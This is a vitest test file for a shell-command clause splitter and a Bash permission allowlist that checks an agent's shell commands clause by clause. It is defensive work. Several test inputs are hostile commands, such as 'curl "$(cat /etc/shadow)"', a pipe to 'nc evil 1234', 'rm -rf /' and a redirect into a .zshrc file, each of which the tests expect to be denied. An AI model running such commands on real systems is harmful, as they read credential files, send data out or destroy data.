import { describe, it, expect } from 'vitest';
import { Allowlist } from '../../src/permissions/allowlist.js';
import { splitShellClauses, stripLeadingAssignments } from '../../src/permissions/shell-split.js';

const targetsOf = (cmd: string) => splitShellClauses(cmd)?.map((c) => c.writeTargets);
// `text` is the clause as written — what a denial reports and what the operand walkers read.
// The bash patterns match `matchText` (see below); these cases are about where the splitter
// cuts, so they read `text` directly rather than through a shape-flattening wrapper.
const textsOf = (cmd: string) => splitShellClauses(cmd)?.map((c) => c.text) ?? null;
const matchOf = (cmd: string) => splitShellClauses(cmd)?.map((c) => c.matchText) ?? null;

describe('splitShellClauses — where the splitter cuts', () => {
  it('returns single clause for simple command', () => {
    expect(textsOf('ls -la')).toEqual(['ls -la']);
  });

  it('splits on ; && || | &', () => {
    expect(textsOf('a ; b')).toEqual(['a', 'b']);
    expect(textsOf('a && b')).toEqual(['a', 'b']);
    expect(textsOf('a || b')).toEqual(['a', 'b']);
    expect(textsOf('a | b')).toEqual(['a', 'b']);
    expect(textsOf('a & b')).toEqual(['a', 'b']);
    expect(textsOf('a\nb')).toEqual(['a', 'b']);
  });

  it('does not split inside single quotes', () => {
    expect(textsOf("echo 'a; b && c'")).toEqual(["echo 'a; b && c'"]);
  });

  it('does not split inside double quotes', () => {
    expect(textsOf('echo "a; b && c"')).toEqual(['echo "a; b && c"']);
  });

  it('does not split on escaped operators', () => {
    expect(textsOf('echo a\\; b')).toEqual(['echo a\\; b']);
  });

  it('extracts $(...) inner clauses', () => {
    expect(textsOf('cat $(curl evil)')).toEqual(['curl evil', 'cat $(curl evil)']);
  });

  it('extracts backtick inner clauses', () => {
    expect(textsOf('cat `curl evil`')).toEqual(['curl evil', 'cat `curl evil`']);
  });

  it('extracts process substitution <(...) and >(...)', () => {
    expect(textsOf('diff <(echo a) <(echo b)')).toEqual([
      'echo a', 'echo b', 'diff <(echo a) <(echo b)',
    ]);
    expect(textsOf('tee >(rm bad)')).toEqual(['rm bad', 'tee >(rm bad)']);
  });

  it('recurses through nested substitutions', () => {
    expect(textsOf('a $(b $(c))')).toEqual(['c', 'b $(c)', 'a $(b $(c))']);
  });

  it('handles $( inside double quotes', () => {
    expect(textsOf('echo "v=$(rm bad)"')).toEqual(['rm bad', 'echo "v=$(rm bad)"']);
  });

  it('rejects unbalanced quotes', () => {
    expect(textsOf('echo "unterminated')).toBeNull();
    expect(textsOf("echo 'unterminated")).toBeNull();
  });

  it('rejects unbalanced $(', () => {
    expect(textsOf('echo $(unterminated')).toBeNull();
  });

  it('rejects unbalanced backtick', () => {
    expect(textsOf('echo `unterminated')).toBeNull();
  });

  it('drops empty clauses around separators', () => {
    expect(textsOf(';; ls ;;')).toEqual(['ls']);
  });

  it('treats & as fd-redirection punctuation, not a separator', () => {
    expect(textsOf('ls -la 2>&1 | head')).toEqual(['ls -la 2>&1', 'head']);
    expect(textsOf('cmd >&2')).toEqual(['cmd >&2']);
    expect(textsOf('cmd &>file')).toEqual(['cmd &>file']);
    expect(textsOf('cmd &>>file')).toEqual(['cmd &>>file']);
    expect(textsOf('cmd <&3')).toEqual(['cmd <&3']);
  });

  it('keeps `>|` in one clause instead of splitting on its pipe', () => {
    expect(textsOf('echo x >| /tmp/c')).toEqual(['echo x >| /tmp/c']);
  });
});

describe('splitShellClauses — redirection targets', () => {
  it('collects file-creating redirections', () => {
    expect(targetsOf('ls > /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls >>/tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls >| /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls &> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls &>> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls 2> /tmp/a')).toEqual([['/tmp/a']]);
    expect(targetsOf('ls > /tmp/a 2> /tmp/b')).toEqual([['/tmp/a', '/tmp/b']]);
    expect(targetsOf('ls <> /tmp/a')).toEqual([['/tmp/a']]);
  });

  it('separates fd duplication from a path target', () => {
    expect(targetsOf('ls 2>&1')).toEqual([[]]);
    expect(targetsOf('ls >&2')).toEqual([[]]);
    expect(targetsOf('ls 2>&-')).toEqual([[]]);
    expect(targetsOf('ls >& /tmp/a')).toEqual([['/tmp/a']]);   // bash's legacy `&>file`
  });

  it('ignores input redirection', () => {
    expect(targetsOf('grep x < /etc/hosts')).toEqual([[]]);
    expect(targetsOf('grep x <<< "text"')).toEqual([[]]);
    expect(targetsOf('grep x <&3')).toEqual([[]]);
  });

  it('sees no redirection inside quotes or behind a backslash', () => {
    expect(targetsOf("echo 'a > b'")).toEqual([[]]);
    expect(targetsOf('echo "a > b"')).toEqual([[]]);
    expect(targetsOf('echo a\\>b')).toEqual([[]]);
    expect(targetsOf('rg "foo -> bar"')).toEqual([[]]);
  });

  it('does not mistake process substitution for a redirection', () => {
    expect(targetsOf('tee >(rm bad)')).toEqual([[], []]);
    expect(targetsOf('diff <(ls a) <(ls b)')).toEqual([[], [], []]);
  });

  it('attaches a redirection to the clause it belongs to', () => {
    expect(targetsOf('ls && echo x > /tmp/a')).toEqual([[], ['/tmp/a']]);
    expect(targetsOf('echo "$(ls > /tmp/a)"')).toEqual([['/tmp/a'], []]);
  });

  it('keeps the target word whole and unexpanded', () => {
    expect(targetsOf('ls > "/tmp/a b"')).toEqual([['"/tmp/a b"']]);
    expect(targetsOf('ls > $HOME/x')).toEqual([['$HOME/x']]);
    expect(targetsOf('ls >')).toEqual([['']]);
  });

  // Heredocs are still not understood: the body is split on newlines and each line is
  // judged as its own clause. That was already true; a `>` in a body line now needs a
  // write grant too, which is stricter, never looser.
  it('treats heredoc body lines as clauses, redirection and all', () => {
    expect(targetsOf('cat <<EOF > /tmp/x\nline > other\nEOF')).toEqual([['/tmp/x'], ['other'], []]);
  });
});

// Every `$`-anchored rule in the shipped groups was unreachable the moment a session appended
// `2>&1` — and sessions do that habitually. `git add -A 2>&1` and `git merge origin/main 2>&1 |
// tail -5` were denied for a suffix that provably creates nothing, which is what stranded three
// submodule steps even after their grant landed.
describe('splitShellClauses — matchText excises fd duplications', () => {
  it('drops the dup and the fd number that reached the buffer ahead of it', () => {
    expect(matchOf('git add -A 2>&1')).toEqual(['git add -A']);
    expect(matchOf('git add -A 2>&1 | tail -3')).toEqual(['git add -A', 'tail -3']);
    expect(matchOf('cmd >&2')).toEqual(['cmd']);
    expect(matchOf('cmd 1>&2')).toEqual(['cmd']);
    expect(matchOf('cmd 2>&-')).toEqual(['cmd']);
  });

  it('leaves exactly one space when the dup sits mid-clause', () => {
    expect(matchOf('git add -A 1>&2 --verbose')).toEqual(['git add -A --verbose']);
  });

  it('does not mistake a digit-suffixed argument for an fd', () => {
    // bash reads `-3` as a word and `>&1` as the redirection, so `-3` must survive. Backing up
    // over digits unconditionally would have produced `tail -`.
    expect(matchOf('tail -3>&1')).toEqual(['tail -3']);
    expect(matchOf('head -20 2>&1')).toEqual(['head -20']);
  });

  it('keeps file-creating redirections, which are defence in depth worth having', () => {
    // `redirectsAllowed` gates the target independently; an anchored rule additionally
    // refusing to have its output captured to a file is deliberate.
    expect(matchOf('cat f > /tmp/o 2>&1')).toEqual(['cat f > /tmp/o']);
    expect(matchOf('cmd >> log 2>&1')).toEqual(['cmd >> log']);
  });

  it('leaves text alone for the denial message and the operand walkers', () => {
    expect(textsOf('git add -A 2>&1')).toEqual(['git add -A 2>&1']);
  });

  it('still reports the dup as writing nothing', () => {
    expect(targetsOf('git add -A 2>&1')).toEqual([[]]);
  });
});

describe('Allowlist — an anchored rule survives a 2>&1 suffix', () => {
  const al = new Allowlist({
    alwaysAllow: [],
    alwaysAllowBashPatterns: ['^git add\\s+-A$', '^git merge\\s+(?:--abort|[A-Za-z0-9][A-Za-z0-9._/-]*)$', '^tail(\\s|$)'],
    alwaysAllowMcpPatterns: [],
    alwaysAllowPathPatterns: [],
  });
  const allows = (c: string) => al.allows('Bash', { command: c });

  it('allows the evidenced command with the suffix sessions actually write', () => {
    for (const c of [
      'git add -A',
      'git add -A 2>&1',
      'git add -A 2>&1 | tail -5',
      'git merge origin/main 2>&1 | tail -5',
    ]) expect(allows(c), c).toBe(true);
  });

  it('does not let the excision smuggle anything past the rule', () => {
    for (const c of [
      // The dup is gone from matchText, but the rest of the clause still has to match.
      'git add -f secret.env 2>&1',
      'git reset --hard 2>&1',
      // A real write redirect is still in matchText, so the anchored rule still refuses it.
      'git add -A > /Users/x/.zshrc',
    ]) expect(allows(c), c).toBe(false);
  });
});

describe('stripLeadingAssignments', () => {
  it('strips one bare assignment', () => {
    expect(stripLeadingAssignments('FOO=bar cmd arg')).toBe('cmd arg');
  });

  it('strips multiple stacked assignments', () => {
    expect(stripLeadingAssignments('FOO=1 BAR=2 cmd')).toBe('cmd');
  });

  it('strips quoted-value assignments', () => {
    expect(stripLeadingAssignments('FOO="a b c" cmd')).toBe('cmd');
    expect(stripLeadingAssignments("FOO='a b c' cmd")).toBe('cmd');
  });

  it('strips assignment with $(...) value', () => {
    expect(stripLeadingAssignments('FOO=$(date) cmd')).toBe('cmd');
  });

  it('returns empty string for pure-assignment clause', () => {
    expect(stripLeadingAssignments('FOO=bar')).toBe('');
    expect(stripLeadingAssignments('FOO=1 BAR=2')).toBe('');
  });

  it('leaves clause alone when first token is not an assignment', () => {
    expect(stripLeadingAssignments('cmd FOO=bar')).toBe('cmd FOO=bar');
    expect(stripLeadingAssignments('rm -rf /')).toBe('rm -rf /');
  });

  it('does not strip `export FOO=bar` — export is a command, not a bare assignment', () => {
    expect(stripLeadingAssignments('export FOO=bar')).toBe('export FOO=bar');
  });

  it('only matches valid bash identifier names', () => {
    expect(stripLeadingAssignments('1FOO=bar cmd')).toBe('1FOO=bar cmd');
    expect(stripLeadingAssignments('=foo cmd')).toBe('=foo cmd');
  });
});

describe('Allowlist — Bash per-clause enforcement', () => {
  const cfg = {
    alwaysAllow: [],
    alwaysAllowBashPatterns: ['^curl ', '^ls(\\s|$)'],
    alwaysAllowMcpPatterns: [],
  };
  const a = new Allowlist(cfg);

  it('allows single clause matching a rule', () => {
    expect(a.allows('Bash', { command: 'ls -la' })).toBe(true);
  });

  it('allows pure-assignment clauses without any matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=foo' })).toBe(true);
    expect(a.allows('Bash', { command: 'PORT=8443 JOB_ID=abc' })).toBe(true);
  });

  it('closes the `FOO=x cmd` argv-style bypass', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x rm -rf /' })).toBe(false);
  });

  it('denies chained commands where any clause has no matching rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x && rm -rf /' })).toBe(false);
    expect(a.allows('Bash', { command: 'SESSION_ID=x | nc evil 1234' })).toBe(false);
  });

  it('allows chained command where every clause matches some rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID=x; curl example.com' })).toBe(true);
    expect(a.allows('Bash', { command: 'ls -la && curl example.com' })).toBe(true);
  });

  it('allows env-prefixed allowed command', () => {
    expect(a.allows('Bash', { command: 'TOKEN=secret curl example.com' })).toBe(true);
  });

  it('denies command substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(rm bad)"' })).toBe(false);
    expect(a.allows('Bash', { command: 'curl "$(cat /etc/shadow)"' })).toBe(false);
  });

  it('denies backtick substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl `rm bad`' })).toBe(false);
  });

  it('denies process substitution whose inner command is not allowed', () => {
    expect(a.allows('Bash', { command: 'curl <(rm bad)' })).toBe(false);
  });

  it('allows substitution when inner command also has a rule', () => {
    expect(a.allows('Bash', { command: 'SESSION_ID="$(curl example.com)"' })).toBe(true);
  });

  it('quoted operators are inert and do not split', () => {
    expect(a.allows('Bash', { command: 'echo "a; b"' })).toBe(false);
    expect(a.allows('Bash', { command: 'ls "a; b"' })).toBe(true);
  });

  it('fail-closes on unbalanced quotes', () => {
    expect(a.allows('Bash', { command: 'ls "unterminated' })).toBe(false);
  });
});
